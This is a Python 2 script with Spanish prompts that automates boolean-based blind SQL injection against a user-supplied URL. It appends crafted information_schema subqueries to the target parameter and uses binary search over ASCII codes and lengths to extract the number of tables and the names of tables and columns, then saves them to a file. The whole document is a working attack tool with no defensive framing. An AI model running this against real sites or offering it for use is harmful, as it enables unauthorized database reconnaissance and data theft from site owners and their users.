#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urllib,urllib2
import re
import os
import emblemas

def main():
	os.system('clear');
	print(emblemas.emblemas());
	global target;
	global pattern;
	global alphabet;
	global fieldsInTable;
	global disableTables;
	try:
		fieldsInTable={};
		target=raw_input('#'*50+'\nTarget (http://www.target.com/poc?id=5): ');
		pattern=raw_input('#'*50+'\nPatron a buscar para considerar False: ');
		alphabet=raw_input('#'*50+'\nAlfabeto a considerar: ');
		runBlindSqlInjection();
	except:
		raw_input('Hubo un error...\n');
		main();

def runBlindSqlInjection():
	getTablesUsingDictionary();
	roughNumTables=getRoughNumTables();
	numTables=getNumTables(roughNumTables)-1;
	numTablesLetters=getNumTablesLetters();
	lengthsTablesNames=getLengthsTablesNames(numTablesLetters);
	tablesNames=getTablesNames(numTablesLetters,lengthsTablesNames);
	fieldsInTable=getFieldsInTable(tablesNames);
	data=[numTables,fieldsInTable];
	printData(data);

def getTablesUsingDictionary():
	dictionary=open('tables_dictionary.txt','r');
	global disableTables;
	disableTables="+AND+";
	for table in dictionary:
		table=re.sub(r"\s","",table,flags=re.I);
		query=target+"+and+(select+count(table_name)+from+information_schema.tables+where+table_name='"+table+"')>=1--"
		if(table!="*"):
			disableTables=disableTables+"table_name!='"+table+"'+AND+";
		else:
			disableTables=disableTables+"table_name!='"+table+"'";
		if(isTrue(query)):
			fieldsInTable[table]=[];
			numColumns=getNumFieldsInTable(table);
			indexColumn=0;
			while(indexColumn<numColumns):
				lengthField=getLengthFieldInTable(table,indexColumn);
				indexChar=0;
				tempNameColumn="";
				while(indexChar<lengthField):
					tempNameColumn+=getFieldName(table,indexColumn,indexChar);
					indexChar+=1;
				indexColumn+=1;
				fieldsInTable[table].append(tempNameColumn);
	dictionary.close();

def printData(data):
	fileData="";
	fileData+='\n'+"#"*80+"\nRESULTADOS DE LA INYECCIÓN\n"+"#"*80;
	fileData+="\nTarget:\n "+target;
	fileData+="\nNumero total de tablas: "+str(data[0]);
	i=0;
	fileData+="\n\n"+"="*80+"\nNombres de tablas y columnas encontradas\n"+"="*80+'\n';
	i=0;
	numTables=len(data[1].keys());
	while(i<numTables):
		tableName=data[1].keys()[i];
		fileData+='\n\t'+tableName;
		j=0;
		numFields=len(data[1][tableName])
		while(j<numFields):
			field=data[1][tableName][j];
			fileData+="\n\t\t"+field;
			j+=1;
		i+=1;
	print(fileData);
	file = open('data.txt','w');
	file.write(fileData);
	
def getFieldsInTable(tablesNames):
	i=0;
	numFieldsInTable={};
	while(i<len(alphabet)):
		numTables=len(tablesNames[alphabet[i]]);
		j=0;
		while(j<numTables):
			numFieldsInTable[tablesNames[alphabet[i]][j]]=getNumFieldsInTable(tablesNames[alphabet[i]][j]);
			fieldsInTable[tablesNames[alphabet[i]][j]]=[];
			k=0;
			while(k<numFieldsInTable[tablesNames[alphabet[i]][j]]):
				lengthFieldName=getLengthFieldInTable(tablesNames[alphabet[i]][j],k);
				l=0;
				tempFieldName='';
				while(l<lengthFieldName):
					tableName=tablesNames[alphabet[i]][j];
					tempFieldName+=getFieldName(tableName,k,l);
					l+=1;
				fieldsInTable[tablesNames[alphabet[i]][j]].append(tempFieldName);
				k+=1;
			j+=1;
		i+=1;
	return fieldsInTable;

def getFieldName(tableName,indexField,indexChar,inf=47,sup=123):
	indexChar+=1;
	while(inf<=sup):
		print(emblemas.loader());
		center=((sup-inf)/2)+inf;
		query=target+"+and+(select+ascii(substring(column_name,"+str(indexChar)+",1))+between+"+str(center)+"+AND+"+str(center)+"+from+information_schema.columns+where+table_name='"+tableName+"'+limit+"+str(indexField)+",1)>=1--"
		if(isTrue(query)):
			return chr(center);
		else:
			query=target+"+and+(select+ascii(substring(column_name,"+str(indexChar)+",1))+between+"+str(inf)+"+AND+"+str(center)+"+from+information_schema.columns+where+table_name='"+tableName+"'+limit+"+str(indexField)+",1)>=1--"
			if(isTrue(query)):
				sup=center-1;
			else:
				inf=center+1;
	er='_';
	return er;
	
def getLengthFieldInTable(tableName,indexField,inf=0,sup=1000):
	while(inf<=sup):
		print(emblemas.loader());
		center=((sup-inf)/2)+inf;
		query=target+"+and+(select+length(column_name)+between+"+str(center)+"+AND+"+str(center)+"+from+information_schema.columns+where+table_name='"+tableName+"'+limit+"+str(indexField)+",1)>=1--"
		if(isTrue(query)):
			return center;
		else:
			query=target+"+and+(select+length(column_name)+between+"+str(inf)+"+AND+"+str(center)+"+from+information_schema.columns+where+table_name='"+tableName+"'+limit+"+str(indexField)+",1)>=1--"
			if(isTrue(query)):
				sup=center-1;
			else:
				inf=center+1;
	er=0;
	return 0;

def getNumFieldsInTable(tableName,inf=0,sup=10000):
	while(inf<=sup):
		print(emblemas.loader());
		center=((sup-inf)/2)+inf;
		query=target+"+and+(select+count(column_name)+between+"+str(center)+"+AND+"+str(center)+"+from+information_schema.columns+where+table_name='"+tableName+"')>=1--"
		if(isTrue(query)):
			return center;
		else:
			query=target+"+and+(select+count(column_name)+between+"+str(inf)+"+AND+"+str(center)+"+from+information_schema.columns+where+table_name='"+tableName+"')>=1--"
			if(isTrue(query)):
				sup=center-1;
			else:
				inf=center+1;
	er=0;
	return 0;
	
def getTablesNames(numTablesLetters,lengthTablesNames):
	i=0;
	tablesNames={};
	while(i<len(alphabet)):
		j=0;
		tablesNames[alphabet[i]]=[];
		while(j<numTablesLetters[alphabet[i]]):
			k=0;
			tempName='';
			while(k<lengthTablesNames[alphabet[i]][j]):
				tempName+=getTableName(alphabet[i],j,k);
				k+=1;
			tablesNames[alphabet[i]].append(tempName);
			j+=1;
		i+=1;
	return tablesNames;
		
#BinarySearch
"""
Mientras inf <= sup:
  centro = ((sup - inf) / 2) + inf // División entera: se trunca la fracción
  Si vec[centro] == dato devolver verdadero y/o pos, de lo contrario:
   Si dato < vec[centro] entonces:
    sup = centro - 1
   En caso contrario:
    inf = centro + 1
Fin (Mientras)
Devolver Falso
"""
def getTableName(letter,indexTable,indexChar,inf=47,sup=123):
	indexChar+=1;
	while(inf<=sup):
		print(emblemas.loader());
		center=((sup-inf)/2)+inf;
		query=target+"+and+(select+ascii(substring(table_name,"+str(indexChar)+",1))+between+"+str(center)+"+AND+"+str(center)+"+from+information_schema.tables+where+table_name+LIKE+'"+letter+"%'"+disableTables+"+limit+"+str(indexTable)+",1)>=1--"
		if(isTrue(query)):
			return chr(center);
		else:
			query=target+"+and+(select+ascii(substring(table_name,"+str(indexChar)+",1))+between+"+str(inf)+"+AND+"+str(center)+"+from+information_schema.tables+where+table_name+LIKE+'"+letter+"%'"+disableTables+"+limit+"+str(indexTable)+",1)>=1--"
			if(isTrue(query)):
				sup=center-1;
			else:
				inf=center+1;
	er='_';
	return er;

def getLengthsTablesNames(numTablesLetters):
	i=0;
	lengthsTablesNames={};
	while(i<len(alphabet)):
		j=0;
		if(numTablesLetters[alphabet[i]]>0):
			lengthsTablesNames[alphabet[i]]=[];
			while(j<numTablesLetters[alphabet[i]]):
				lengthsTablesNames[alphabet[i]].append(getLengthTableName(alphabet[i],j)-1);
				print(lengthsTablesNames);
				j=j+1;
		i=i+1;
	return lengthsTablesNames;

def getLengthTableName(letter,index,length=0):
	print(emblemas.loader())
	newTarget=target+"+and+(select+length(table_name)+from+information_schema.tables+where+table_name+LIKE+'"+letter+"%'"+disableTables+"+limit+"+str(index)+",1)>="+str(length)+"--"
	if(isTrue(newTarget)):
		length=length+1;
		return getLengthTableName(letter,index,length);
	else:
		return length;
	
def getNumTables(rough):
	print(emblemas.loader())
	total=rough;
	newTarget=target+"+and+(select+count(table_name)+from+information_schema.tables)>="+str(rough)+"--"
	if(isTrue(newTarget)):
		rough=rough+1;
		return getNumTables(rough);
	else:
		return total;

def getRoughNumTables(count=10):
	print(emblemas.loader())
	newTarget=target+"+and+(select+count(table_name)+between+0+AND+"+str(count+10)+"+from+information_schema.tables)>=1--"
	if(isTrue(newTarget)):
		return count;
	else:
		count=count+15;
		return getRoughNumTables(count);

def getNumTablesLetters():
	i=0;
	numTablesLetter={};
	while(i<len(alphabet)):
		numTablesLetter[alphabet[i]]=getNumTablesLetter(alphabet[i]);
		print(numTablesLetter);
		i=i+1;
	return numTablesLetter;

def getNumTablesLetter(letter,count=0):
	print(emblemas.loader())
	total=count;
	newTarget=target+"+and+(select+count(table_name)+from+information_schema.tables+where+table_name+LIKE+'"+letter+"%'"+disableTables+")>="+str(count)+"--"
	if(isTrue(newTarget)):
		count=count+1;
		return getNumTablesLetter(letter,count);
	else:
		return total;
	
def isTrue(newTarget):
	print(newTarget);
	path=re.match('https?://(([a-zA-Z]+)?\.?[a-zA-Z]+\.[a-zA-Z]+)(\/.*)?',newTarget,re.I);
	path=path.group(3);
	path=path if path!=None else '/';
	connection=urllib2.urlopen(newTarget);
	response=connection.read();
	connection.close();
	matches=re.findall(pattern,response,flags=re.I);
	if(len(matches)==0):
		return True;
	else:
		return False;
		
if __name__=='__main__': 
	main();
